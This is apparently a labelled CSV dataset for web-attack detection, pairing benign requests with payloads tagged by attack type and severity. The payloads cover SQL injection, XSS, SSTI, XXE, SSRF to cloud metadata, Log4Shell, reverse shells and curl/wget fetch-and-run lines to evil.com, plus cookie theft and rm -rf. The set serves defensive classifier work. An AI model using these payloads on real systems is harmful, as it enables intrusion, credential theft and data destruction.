text,label,attack_type,severity
%3Cimg%20src=x%20onerror=alert%28%27XSS%27%29%3E,1,xss,medium
X-Forwarded-For: %3Cimg+src%3Dx+onerror%3Dalert%281%29%3E,1,xss,medium
GET /users/order-12345/profile HTTP/1.1,0,normal,none
export report fr,0,normal,none
http://127.0.0.1:22,1,ssrf,high
"%27%20OR%20BENCHMARK%281000000,MD5%28%27a%27%29%29--",1,sql_injection,high
"GET /page?id=127.0.0.1%20&&%20whoami HTTP/1.1
Host: target.com",1,command_injection,critical
"GET /search?input=%27%20UNION%20SELECT%20username,password%20FROM%20users-- HTTP/1.1
Host: target.com",1,sql_injection,high
"content-type: application/json
body: {{""name"":""products""}}",0,normal,none
{{%27%27.__class__.__mro__[2].__subclasses__%28%29}},1,ssti,high
X-Forwarded-For: ' OR '1'='1'--,1,sql_injection,high
1' AND 1=1--,1,sql_injection,high
delete item id=electronics,0,normal,none
../../../../proc/version,1,path_traversal,medium
User-Agent: 1 OR 1=1/*,1,sql_injection,high
User-Agent: {{''.__class__.__base__.__subclasses__()}},1,ssti,high
"POST /api/data HTTP/1.1
Host: target.com

input=<#assign ex=""freemarker.template.utility.Execute""?new()>${ex(""id"")}",1,ssti,high
Authorization: Basic cm9vdDpyb290,1,brute_force,low
create new post title=blue,0,normal,none
X-Forwarded-For: %3Cbody%20onload=alert%281%29%3E,1,xss,medium
filter results by category=2,0,normal,none
export report contact,0,normal,none
"GET /page?id=1%27%20AND%20ASCII%28SUBSTRING%28%28SELECT%20password%20FROM%20users%20LIMIT%201%29,1,1%29%29%3E64-- HTTP/1.1
Host: target.com",1,sql_injection,high
;%20crontab%20-l,1,command_injection,critical
SELECT%20*%20FROM%20users%20WHERE%20id=1%20OR%201=1,1,sql_injection,high
"POST /api/data HTTP/1.1
Host: target.com

input=$(jndi:ldap://evil.com/a)",1,log4shell,critical
%3Cimg%20src=x%20onerror=alert%28%27XSS%27%29%3E,1,xss,medium
; curl http://evil.com/shell.sh | bash,1,command_injection,critical
download file es.pdf,0,normal,none
Referer: http://target.com/?q=%3Cobject%20data=javascript:alert%281%29%3E,1,xss,medium
"POST /api/orders body={{""item"":""products""}}",0,normal,none
"POST /api/data HTTP/1.1
Host: target.com

input=id=1%27%20AND%20%271%27=%271",1,sql_injection,high
filter results by category=home,0,normal,none
"POST /api/data HTTP/1.1
Host: target.com

input=..\..\..\windows\win.ini",1,path_traversal,medium
POST /api/cart add item=home,0,normal,none
X-Forwarded-For: %27%20OR%20SLEEP%285%29--,1,sql_injection,high
X-Forwarded-For: http://evil.com@127.0.0.1/admin,1,ssrf,high
User-Agent: {{request|attr%28%27application%27%29|attr%28%27\x5f\x5fglobals\x5f\x5f%27%29|attr%28%27\x5f\x5fgetitem\x5f\x5f%27%29%28%27\x5f\x5fbuiltins\x5f\x5f%27%29|attr%28%27\x5f\x5fgetitem\x5f\x5f%27%29%28%27\x5f\x5fimport\x5f\x5f%27%29%28%27os%27%29|attr%28%27popen%27%29%28%27id%27%29|attr%28%27read%27%29%28%29}},1,ssti,high
Referer: http://target.com/?q=%27%20OR%201=1#,1,sql_injection,high
"GET /page?id=../../../../etc/hosts HTTP/1.1
Host: target.com",1,path_traversal,medium
edit comment id=laptops,0,normal,none
"GET /search?input=<?xml version=""1.0""?><!DOCTYPE foo [<!ENTITY xxe SYSTEM ""http://evil.com/xxe"">]><foo>&xxe;</foo> HTTP/1.1
Host: target.com",1,xxe,high
search query for jane_smith,0,normal,none
delete item id=faq,0,normal,none
"GET /page?id=sftp://127.0.0.1:22 HTTP/1.1
Host: target.com",1,ssrf,high
download file laptops.pdf,0,normal,none
"GET /page?id=' OR 1=1# HTTP/1.1
Host: target.com",1,sql_injection,high
User-Agent: ${self.module.cache.util.os.system%28%27id%27%29},1,ssti,high
%27%20OR%20%271%27=%271%27--,1,sql_injection,high
"GET /search?input=User-Agent:%20${jndi:ldap://evil.com/a} HTTP/1.1
Host: target.com",1,log4shell,critical
export report csv,0,normal,none
X-Forwarded-For: %3Ciframe%20onload=alert%281%29%3E,1,xss,medium
GET /blog/home HTTP/1.1,0,normal,none
Referer: http://target.com/?q=..%252f..%252f..%252fetc%252fpasswd,1,path_traversal,medium
"GET /page?id=../../../../proc/self/environ HTTP/1.1
Host: target.com",1,path_traversal,medium
`ls%20-la`,1,command_injection,critical
%3Cinput%20autofocus%20onfocus=alert%281%29%3E,1,xss,medium
Referer: http://target.com/?q=' OR pg_sleep(5)--,1,sql_injection,high
User-Agent: <select onchange=alert(1)><option>1</option></select>,1,xss,medium
"Referer: http://target.com/?q=%27%20OR%20BENCHMARK%281000000,MD5%28%27a%27%29%29--",1,sql_injection,high
"GET /page?id=; python -c 'import socket,subprocess,os;s=socket.socket();s.connect((""evil.com"",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([""/bin/sh"",""-i""])' HTTP/1.1
Host: target.com",1,command_injection,critical
"POST /api/feedback body={{""message"":""bob""}}",0,normal,none
"GET /page?id=<audio src=x onerror=alert(1)> HTTP/1.1
Host: target.com",1,xss,medium
"GET /page?id=%3C?xml%20version=%221.0%22?%3E%3C!DOCTYPE%20foo%20[%3C!ENTITY%20xxe%20SYSTEM%20%22file:///etc/shadow%22%3E]%3E%3Cfoo%3E&xxe;%3C/foo%3E HTTP/1.1
Host: target.com",1,xxe,high
POST /api/cart add item=january,0,normal,none
"GET /page?id=& ls -la HTTP/1.1
Host: target.com",1,command_injection,critical
zip://path/to/file.zip#file.php,1,path_traversal,medium
"GET /search?input=user=admin&pwd=password HTTP/1.1
Host: target.com",1,brute_force,low
"GET /page?id=%3Cscript%3Edocument.location=%27http://evil.com/steal?c=%27+document.cookie%3C/script%3E HTTP/1.1
Host: target.com",1,xss,medium
GET /docs/march.html,0,normal,none
"GET /page?id=%27%20OR%20pg_sleep%285%29-- HTTP/1.1
Host: target.com",1,sql_injection,high
"POST /api/data HTTP/1.1
Host: target.com

input=%3Caudio%20src=x%20onerror=alert%281%29%3E",1,xss,medium
Referer: http://target.com/?q=admin'--,1,sql_injection,high
#set%28$x=%27%27%29#set%28$rt=$x.class.forName%28%27java.lang.Runtime%27%29%29#set%28$chr=$x.class.forName%28%27java.lang.Character%27%29%29#set%28$str=$x.class.forName%28%27java.lang.String%27%29%29#set%28$ex=$rt.getRuntime%28%29.exec%28%27id%27%29%29$ex.waitFor%28%29,1,ssti,high
%0a%20ls%20-la,1,command_injection,critical
"GET /page?id=Authorization:%20Basic%20cm9vdDpyb290 HTTP/1.1
Host: target.com",1,brute_force,low
"GET /search?input=1%27%20AND%20%28SELECT%20*%20FROM%20users%29%20%3E%200-- HTTP/1.1
Host: target.com",1,sql_injection,high
"GET /search?input=|%20nc%20evil.com%204444%20-e%20/bin/sh HTTP/1.1
Host: target.com",1,command_injection,critical
X-Forwarded-For: %27%20OR%20%27x%27=%27x,1,sql_injection,high
X-Forwarded-For: $(jndi:ldap://evil.com/a),1,log4shell,critical
User-Agent: User-Agent:%20${jndi:ldap://evil.com/a},1,log4shell,critical
export report pdf,0,normal,none
Referer: http://target.com/?q={{''.__class__.__mro__[2].__subclasses__()}},1,ssti,high
"POST /api/data HTTP/1.1
Host: target.com

input=; echo 'hacked' > /tmp/pwned",1,command_injection,critical
"POST /api/data HTTP/1.1
Host: target.com

input=..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",1,path_traversal,medium
"Referer: http://target.com/?q=%3C!DOCTYPE%20test%20[%20%3C!ENTITY%20%%20init%20SYSTEM%20%22data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk%22%3E%20%init;%20]%3E%3Cfoo/%3E",1,xxe,high
Referer: http://target.com/?q=| nc evil.com 4444 -e /bin/sh,1,command_injection,critical
"GET /search?input=%27%20OR%20pg_sleep%285%29-- HTTP/1.1
Host: target.com",1,sql_injection,high
GET /search?q=10&page=1,0,normal,none
"POST /api/orders body={{""item"":""de""}}",0,normal,none
User-Agent: php://filter/convert.base64-encode/resource=/etc/passwd,1,path_traversal,medium
"GET /search?input=%3Cbody%20onload=alert%281%29%3E HTTP/1.1
Host: target.com",1,xss,medium
X-Forwarded-For: ..\..\..\..\windows\system32\drivers\etc\hosts,1,path_traversal,medium
GET /users/size/profile HTTP/1.1,0,normal,none
%3Cselect%20onchange=alert%281%29%3E%3Coption%3E1%3C/option%3E%3C/select%3E,1,xss,medium
X-Forwarded-For: ;%20rm%20-rf%20/tmp/*,1,command_injection,critical
"content-type: application/json
body: {{""name"":""february""}}",0,normal,none
search query for 25,0,normal,none
Referer: http://target.com/?q=callback=http://internal-service/secret,1,ssrf,high
username=&password=password,1,brute_force,low
Referer: http://target.com/?q=%3C?xml%20version=%221.0%22?%3E%3C!DOCTYPE%20root%20[%3C!ENTITY%20test%20SYSTEM%20%22file:///etc/hostname%22%3E]%3E%3Croot%3E&test;%3C/root%3E,1,xxe,high
"GET /search?input=${jndi:ldap://evil.com/${java:version}} HTTP/1.1
Host: target.com",1,log4shell,critical
file:///c:/boot.ini,1,path_traversal,medium
X-Forwarded-For: %3Cinput%20autofocus%20onfocus=alert%281%29%3E,1,xss,medium
"GET /page?id=1%27%20AND%20%28SELECT%20*%20FROM%20users%29%20%3E%200-- HTTP/1.1
Host: target.com",1,sql_injection,high
User-Agent: %27%20OR%201=1--,1,sql_injection,high
POST /api/cart add item=order-12345,0,normal,none
"GET /search?input=|%20ipconfig HTTP/1.1
Host: target.com",1,command_injection,critical
http://localhost:8080/manager,1,ssrf,high
&%20id,1,command_injection,critical
User-Agent: ; env,1,command_injection,critical
"GET /search?input=${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://evil.com/a} HTTP/1.1
Host: target.com",1,log4shell,critical
upload image photo_xml.jpg,0,normal,none
Referer: http://target.com/?q=http://127.0.0.1:8080/admin,1,ssrf,high
"POST /api/orders body={{""item"":""database""}}",0,normal,none
load data from john_doe,0,normal,none
Referer: http://target.com/?q=%3Ciframe%20src=javascript:alert%281%29%3E,1,xss,medium
"GET /page?id=1%27%20ORDER%20BY%20100-- HTTP/1.1
Host: target.com",1,sql_injection,high
Referer: http://target.com/?q=http://127.0.0.1:22,1,ssrf,high
sort items by john_doe ascending,0,normal,none
GET /images/csv.png,0,normal,none
edit comment id=2024,0,normal,none
Referer: http://target.com/?q=file:///c:/windows/win.ini,1,path_traversal,medium
"content-type: application/json
body: {{""name"":""csv""}}",0,normal,none
POST /api/cart add item=javascript,0,normal,none
GET /users/mobile-apps/profile HTTP/1.1,0,normal,none
${jndi:ldap://evil.com/${java:version}},1,log4shell,critical
sort items by blue ascending,0,normal,none
Referer: http://target.com/?q=|%20cat%20/etc/shadow,1,command_injection,critical
"GET /page?id={{request}} HTTP/1.1
Host: target.com",1,ssti,high
search query for en,0,normal,none
User-Agent: <body onload=alert(1)>,1,xss,medium
User-Agent: 1 AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,1,sql_injection,high
Referer: http://target.com/?q=| env,1,command_injection,critical
X-Forwarded-For: $%28id%29,1,command_injection,critical
delete item id=txt,0,normal,none
"GET /search?input=%3CIMG%20SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;:alert%28%27XSS%27%29%3E HTTP/1.1
Host: target.com",1,xss,medium
User-Agent: username=sa&password=sa,1,brute_force,low
GET /users/about/profile HTTP/1.1,0,normal,none
User-Agent: <select onchange=alert(1)><option>1</option></select>,1,xss,medium
$(cat /etc/passwd),1,command_injection,critical
"X-Forwarded-For: <?xml version=""1.0""?><!DOCTYPE foo [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><foo>&xxe;</foo>",1,xxe,high
"GET /search?input=php://filter/read=convert.base64-encode/resource=index.php HTTP/1.1
Host: target.com",1,path_traversal,medium
"GET /search?input=1 AND (SELECT SUBSTRING(username,1,1) FROM users WHERE username='admin')='a' HTTP/1.1
Host: target.com",1,sql_injection,high
"POST /api/data HTTP/1.1
Host: target.com

input=gopher://127.0.0.1:6379/_INFO",1,ssrf,high
X-Forwarded-For: 1%27%20AND%20%28SELECT%20*%20FROM%20users%29%20%3E%200--,1,sql_injection,high
Referer: http://target.com/?q=%3Csvg%20onload=alert%28document.domain%29%3E,1,xss,medium
"GET /search?input=login=admin&pass=admin HTTP/1.1
Host: target.com",1,brute_force,low
username=2024&action=login,0,normal,none
create new post title=cloud-computing,0,normal,none
<script>document.location='http://evil.com/steal?c='+document.cookie</script>,1,xss,medium
GET /api/status?service=electronics,0,normal,none
../../../../home/user/.ssh/id_rsa,1,path_traversal,medium
"GET /search?input=1%27%20UNION%20ALL%20SELECT%20NULL,NULL,NULL-- HTTP/1.1
Host: target.com",1,sql_injection,high
sort items by order-12345 ascending,0,normal,none
Referer: http://target.com/?q=1 OR 1=1,1,sql_injection,high
"POST /api/data HTTP/1.1
Host: target.com

input=1; SELECT pg_sleep(5)--",1,sql_injection,high
POST /api/cart add item=2025,0,normal,none
"POST /api/orders body={{""item"":""json""}}",0,normal,none
${${upper:j}ndi:ldap://evil.com/a},1,log4shell,critical
"GET /page?id=../../etc/passwd HTTP/1.1
Host: target.com",1,path_traversal,medium
"GET /search?input=....\....\....\etc\passwd HTTP/1.1
Host: target.com",1,path_traversal,medium
"GET /search?input=%3Cobject%20data=javascript:alert%281%29%3E HTTP/1.1
Host: target.com",1,xss,medium
Referer: http://target.com/?q=..%252f..%252f..%252fetc%252fpasswd,1,path_traversal,medium
Referer: http://target.com/?q=username=admin&password=,1,brute_force,low
http://127.0.0.1/admin,1,ssrf,high
X-Forwarded-For: %3CIMG%20SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;:alert%28%27XSS%27%29%3E,1,xss,medium
Referer: http://target.com/?q=| rm -rf /,1,command_injection,critical
"GET /search?input=;%20ipconfig HTTP/1.1
Host: target.com",1,command_injection,critical
username=home&action=login,0,normal,none
"GET /search?input=<script>alert(1)</script> HTTP/1.1
Host: target.com",1,xss,medium
Referer: http://target.com/?q=${self.module.cache.util.os.system%28%27id%27%29},1,ssti,high
Referer: http://target.com/?q=User-Agent:%20${jndi:ldap://evil.com/a},1,log4shell,critical
"POST /api/data HTTP/1.1
Host: target.com

input=1%27%20ORDER%20BY%201--",1,sql_injection,high
User-Agent: admin%27%20#,1,sql_injection,high
Referer: http://target.com/?q=http://127.0.0.1:6379,1,ssrf,high
X-Forwarded-For: %2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd,1,path_traversal,medium
;%20wget%20http://evil.com/shell.sh%20-O%20/tmp/shell.sh%20&&%20bash%20/tmp/shell.sh,1,command_injection,critical
User-Agent: ../../../../etc/passwd,1,path_traversal,medium
<video src=x onerror=alert(1)>,1,xss,medium
"GET /search?input=%3Cp%20onmouseover=%27alert%281%29%27%3Ehover%3C/p%3E HTTP/1.1
Host: target.com",1,xss,medium
"POST /api/orders body={{""item"":""february""}}",0,normal,none
"POST /api/data HTTP/1.1
Host: target.com

input=user=oracle&password=oracle",1,brute_force,low
"GET /page?id=%22%3E%3Cimg%20src=x%20onerror=alert%281%29%3E HTTP/1.1
Host: target.com",1,xss,medium
X-Forwarded-For: javascript:alert%281%29,1,xss,medium
search query for summary-q3,0,normal,none
User-Agent: ${jndi:ldap://evil.com/${java:version}},1,log4shell,critical
download file bob.pdf,0,normal,none
"POST /api/data HTTP/1.1
Host: target.com

input=http://evil.com@127.0.0.1/admin",1,ssrf,high
create new post title=invoice-2024,0,normal,none
"POST /api/data HTTP/1.1
Host: target.com

input=username=hadoop&password=hadoop",1,brute_force,low
Referer: http://target.com/?q=%3C%=%207*7%20%%3E,1,ssti,high
User-Agent: file:///etc/passwd,1,path_traversal,medium
"GET /page?id=../../../../var/log/nginx/access.log HTTP/1.1
Host: target.com",1,path_traversal,medium
delete item id=alice,0,normal,none
Referer: http://target.com/?q=%3Caudio%20src=x%20onerror=alert%281%29%3E,1,xss,medium
"GET /page?id=gopher://127.0.0.1:9200/_cat/indices HTTP/1.1
Host: target.com",1,ssrf,high
"GET /page?id={{''|attr('__class__')|attr('__base__')|attr('__subclasses__')()}} HTTP/1.1
Host: target.com",1,ssti,high
"POST /api/data HTTP/1.1
Host: target.com

input=%3C?xml%20version=%221.0%22?%3E%3C!DOCTYPE%20lolz%20[%3C!ENTITY%20lol%20%22lol%22%3E%3C!ENTITY%20lol9%20%22&lol;&lol;&lol;%22%3E]%3E%3Cfoo%3E&lol9;%3C/foo%3E",1,xxe,high
"POST /api/orders body={{""item"":""john_doe""}}",0,normal,none
%27%20HAVING%201=1--,1,sql_injection,high
GET /api/status?service=blue,0,normal,none
X-Forwarded-For: |%20cat%20/etc/passwd,1,command_injection,critical
"GET /search?input=;%20ps%20aux HTTP/1.1
Host: target.com",1,command_injection,critical
"GET /search?input=Authorization: Basic YWRtaW46YWRtaW4= HTTP/1.1
Host: target.com",1,brute_force,low
PUT /api/users/blue/settings,0,normal,none
"GET /page?id=dict://127.0.0.1:6379/info HTTP/1.1
Host: target.com",1,ssrf,high
"%27%20UNION%20SELECT%20NULL,NULL,NULL--",1,sql_injection,high
javascript:alert%281%29,1,xss,medium
User-Agent: |%20ls%20-la,1,command_injection,critical
GET /category/electronics/items,0,normal,none
user=admin&pwd=password,1,brute_force,low
sort items by 10 ascending,0,normal,none
User-Agent: &%20whoami,1,command_injection,critical
User-Agent: javascript:alert(1),1,xss,medium
%27%20AND%20EXISTS%28SELECT%20*%20FROM%20users%29--,1,sql_injection,high
"GET /page?id=$%28cat%20/etc/passwd%29 HTTP/1.1
Host: target.com",1,command_injection,critical
"GET /page?id=%3C!DOCTYPE%20foo%20[%3C!ENTITY%20%%20xxe%20SYSTEM%20%22file:///etc/passwd%22%3E%20%3C!ENTITY%20%%20load%20SYSTEM%20%22php://filter/read=convert.base64-encode/resource=file:///etc/passwd%22%3E]%3E HTTP/1.1
Host: target.com",1,xxe,high
"POST /api/data HTTP/1.1
Host: target.com

input=%27%20OR%201=1#",1,sql_injection,high
Referer: http://target.com/?q=../etc/passwd,1,path_traversal,medium
GET /images/1.png,0,normal,none
GET /api/status?service=smartphones,0,normal,none
"GET /search?input=%3Caudio%20src=x%20onerror=alert%281%29%3E HTTP/1.1
Host: target.com",1,xss,medium
"GET /page?id=http://spoofed.burpcollaborator.net HTTP/1.1
Host: target.com",1,ssrf,high
"POST /api/data HTTP/1.1
Host: target.com

input=1' AND 1=1--",1,sql_injection,high
GET /products/about HTTP/1.1,0,normal,none
"POST /api/data HTTP/1.1
Host: target.com

input=;%20netstat%20-an",1,command_injection,critical
GET /users/machine-learning/profile HTTP/1.1,0,normal,none
"GET /page?id=%27%20OR%20%271%27=%271 HTTP/1.1
Host: target.com",1,sql_injection,high
"GET /page?id=..././..././..././etc/passwd HTTP/1.1
Host: target.com",1,path_traversal,medium
"GET /search?input=username=admin&password=admin123 HTTP/1.1
Host: target.com",1,brute_force,low
"GET /page?id=<form action='javascript:alert(1)'><input type=submit></form> HTTP/1.1
Host: target.com",1,xss,medium
filter results by category=green,0,normal,none
"POST /api/orders body={{""item"":""en""}}",0,normal,none
GET /images/services.png,0,normal,none
"GET /page?id=../../etc/passwd HTTP/1.1
Host: target.com",1,path_traversal,medium
"GET /page?id=1%20OR%201=1/* HTTP/1.1
Host: target.com",1,sql_injection,high
load data from name,0,normal,none
"POST /api/data HTTP/1.1
Host: target.com

input=;%20wget%20http://evil.com/shell.sh%20-O%20/tmp/shell.sh%20&&%20bash%20/tmp/shell.sh",1,command_injection,critical
"GET /page?id=%3Clink%20rel=import%20href=javascript:alert%281%29%3E HTTP/1.1
Host: target.com",1,xss,medium
"POST /api/data HTTP/1.1
Host: target.com

input=%3Cimg%20src=x%20onerror=alert%281%29%3E",1,xss,medium
"POST /api/data HTTP/1.1
Host: target.com

input=..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",1,path_traversal,medium
"POST /api/data HTTP/1.1
Host: target.com

input=%3Cdetails%20open%20ontoggle=alert%281%29%3E",1,xss,medium
"GET /page?id=1; SELECT pg_sleep(5)-- HTTP/1.1
Host: target.com",1,sql_injection,high
User-Agent: <svg onload=alert(1)>,1,xss,medium
"GET /page?id=%3Cstyle%3E*{background:url%28%27javascript:alert%281%29%27%29}%3C/style%3E HTTP/1.1
Host: target.com",1,xss,medium
"GET /search?input=%3C?xml%20version=%221.0%22?%3E%3C!DOCTYPE%20foo%20[%3C!ENTITY%20xxe%20SYSTEM%20%22file:///c:/windows/win.ini%22%3E]%3E%3Cfoo%3E&xxe;%3C/foo%3E HTTP/1.1
Host: target.com",1,xxe,high
"POST /api/data HTTP/1.1
Host: target.com

input=1' AND SLEEP(5)--",1,sql_injection,high
X-Forwarded-For: X-Api-Version: ${jndi:ldap://evil.com/a},1,log4shell,critical
X-Forwarded-For: |%20nc%20evil.com%204444%20-e%20/bin/sh,1,command_injection,critical
username=blue&action=login,0,normal,none
download file de.pdf,0,normal,none
GET /api/status?service=python,0,normal,none
Referer: http://target.com/?q=javascript:alert%28document.cookie%29,1,xss,medium
callback=http://internal-service/secret,1,ssrf,high
"POST /api/feedback body={{""message"":""date""}}",0,normal,none
download file january.pdf,0,normal,none
"GET /page?id=; ipconfig HTTP/1.1
Host: target.com",1,command_injection,critical
User-Agent: username=test&password=test,1,brute_force,low
X-Forwarded-For: 1;%20SELECT%20pg_sleep%285%29--,1,sql_injection,high
filter results by category=xml,0,normal,none
"POST /api/data HTTP/1.1
Host: target.com

input=%3Ciframe%20src=javascript:alert%281%29%3E",1,xss,medium
"POST /api/data HTTP/1.1
Host: target.com

input=' OR 1=1/*",1,sql_injection,high
filter results by category=bob,0,normal,none
"X-Forwarded-For: %27%20UNION%20SELECT%20NULL,NULL,NULL--",1,sql_injection,high
;%20echo%20%27hacked%27%20%3E%20/tmp/pwned,1,command_injection,critical
User-Agent: ....\....\....\etc\passwd,1,path_traversal,medium
"GET /search?input=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token HTTP/1.1
Host: target.com",1,ssrf,high
"GET /page?id=X-Api-Version:%20${jndi:ldap://evil.com/a} HTTP/1.1
Host: target.com",1,log4shell,critical
"POST /api/feedback body={{""message"":""contact""}}",0,normal,none
create new post title=machine-learning,0,normal,none
X-Forwarded-For: ../etc/passwd,1,path_traversal,medium
GET /search?q=cameras&page=1,0,normal,none
"POST /api/data HTTP/1.1
Host: target.com

input=%3CIMG%20SRC=javascript:alert%28%27XSS%27%29%3E",1,xss,medium
User-Agent: 127.0.0.1%20&&%20whoami,1,command_injection,critical
Referer: http://target.com/?q=gopher://127.0.0.1:9200/_cat/indices,1,ssrf,high
upload image photo_2.jpg,0,normal,none
<object data=javascript:alert(1)>,1,xss,medium
User-Agent: <object data=javascript:alert(1)>,1,xss,medium
GET /docs/fr.html,0,normal,none
sort items by tablets ascending,0,normal,none
"POST /api/data HTTP/1.1
Host: target.com

input=../../etc/passwd",1,path_traversal,medium
User-Agent:%20${jndi:ldap://evil.com/a},1,log4shell,critical
delete item id=txt,0,normal,none
${jndi:rmi://evil.com/a},1,log4shell,critical
"GET /page?id=username=root&password=root HTTP/1.1
Host: target.com",1,brute_force,low
GET /products/size HTTP/1.1,0,normal,none
X-Forwarded-For: %27;%20SHUTDOWN--,1,sql_injection,high
GET /images/january.png,0,normal,none
"Referer: http://target.com/?q=%27%20UNION%20SELECT%20username,password%20FROM%20users--",1,sql_injection,high
GET /products/smartphones HTTP/1.1,0,normal,none
X-Forwarded-For: 127.0.0.1%20&&%20whoami,1,command_injection,critical
User-Agent: Authorization:%20Basic%20YWRtaW46YWRtaW4=,1,brute_force,low
%3Cselect%20onchange=alert%281%29%3E%3Coption%3E1%3C/option%3E%3C/select%3E,1,xss,medium
"GET /search?input=<scr<script>ipt>alert(1)</scr</script>ipt> HTTP/1.1
Host: target.com",1,xss,medium
GET /api/status?service=alice,0,normal,none
"content-type: application/json
body: {{""name"":""python""}}",0,normal,none
export report mobile-apps,0,normal,none
User-Agent: ../../../etc/passwd,1,path_traversal,medium
edit comment id=tablets,0,normal,none
Authorization: Basic YWRtaW46YWRtaW4=,1,brute_force,low
"GET /page?id=ftp://127.0.0.1:21 HTTP/1.1
Host: target.com",1,ssrf,high
create new post title=csv,0,normal,none
Referer: http://target.com/?q=gopher://127.0.0.1:6379/_INFO,1,ssrf,high
"POST /api/data HTTP/1.1
Host: target.com

input=Authorization:%20Basic%20cm9vdDpyb290",1,brute_force,low
GET /users/es/profile HTTP/1.1,0,normal,none
Authorization: Basic dGVzdDp0ZXN0,1,brute_force,low
User-Agent: php://filter/read=convert.base64-encode/resource=index.php,1,path_traversal,medium
X-Forwarded-For: ../../../../etc/passwd,1,path_traversal,medium
"POST /api/data HTTP/1.1
Host: target.com

input=Authorization: Basic dGVzdDp0ZXN0",1,brute_force,low
"GET /page?id=""><img src=x onerror=alert(1)> HTTP/1.1
Host: target.com",1,xss,medium
search query for es,0,normal,none
"GET /search?input=%27%20OR%20SLEEP%285%29-- HTTP/1.1
Host: target.com",1,sql_injection,high
"GET /page?id=`ls -la` HTTP/1.1
Host: target.com",1,command_injection,critical
Referer: http://target.com/?q=%27%20UNION%20SELECT%20NULL--,1,sql_injection,high
"GET /page?id=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd HTTP/1.1
Host: target.com",1,path_traversal,medium
{{config.items%28%29}},1,ssti,high
"GET /search?input=../../../../var/log/nginx/access.log HTTP/1.1
Host: target.com",1,path_traversal,medium
Referer: http://target.com/?q=search=%27%20OR%201=1--&submit=Search,1,sql_injection,high
expect://id,1,path_traversal,medium
%0a%20cat%20/etc/passwd,1,command_injection,critical
"content-type: application/json
body: {{""name"":""blue""}}",0,normal,none
X-Forwarded-For: ..%c0%af..%c0%af..%c0%afetc%c0%afpasswd,1,path_traversal,medium
X-Forwarded-For: |%20tee%20/tmp/pwned,1,command_injection,critical
"POST /api/data HTTP/1.1
Host: target.com

input=${jndi:rmi://evil.com/a}",1,log4shell,critical
Referer: http://target.com/?q=1' OR 1=1--,1,sql_injection,high
"GET /page?id=http://169.254.169.254/latest/user-data HTTP/1.1
Host: target.com",1,ssrf,high
Referer: http://target.com/?q=<a href='javascript:alert(1)'>click</a>,1,xss,medium
"GET /search?input=%3Cscr%3Cscript%3Eipt%3Ealert%281%29%3C/scr%3C/script%3Eipt%3E HTTP/1.1
Host: target.com",1,xss,medium
"GET /search?input=username=root&password=toor HTTP/1.1
Host: target.com",1,brute_force,low
"POST /api/data HTTP/1.1
Host: target.com

input=&%20whoami",1,command_injection,critical
load data from services,0,normal,none
"GET /search?input=....//....//....//etc/passwd HTTP/1.1
Host: target.com",1,path_traversal,medium
"GET /page?id=%27%20OR%201=1%20LIMIT%201-- HTTP/1.1
Host: target.com",1,sql_injection,high
delete item id=cameras,0,normal,none
X-Forwarded-For: X-Api-Version: ${jndi:ldap://evil.com/a},1,log4shell,critical
GET /blog/10 HTTP/1.1,0,normal,none
Referer: http://target.com/?q=%3Cselect%20onchange=alert%281%29%3E%3Coption%3E1%3C/option%3E%3C/select%3E,1,xss,medium
javascript:alert(1),1,xss,medium
"POST /api/data HTTP/1.1
Host: target.com

input=%3Clink%20rel=import%20href=javascript:alert%281%29%3E",1,xss,medium
User-Agent: <meta http-equiv='refresh' content='0;url=javascript:alert(1)'>,1,xss,medium
User-Agent: %3Ciframe%20onload=alert%281%29%3E,1,xss,medium
Referer: http://target.com/?q=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token,1,ssrf,high
X-Forwarded-For: 1%27%20OR%201=1--,1,sql_injection,high
GET /search?q=date&page=1,0,normal,none
GET /images/en.png,0,normal,none
"content-type: application/json
body: {{""name"":""fr""}}",0,normal,none
GET /api/status?service=xlsx,0,normal,none
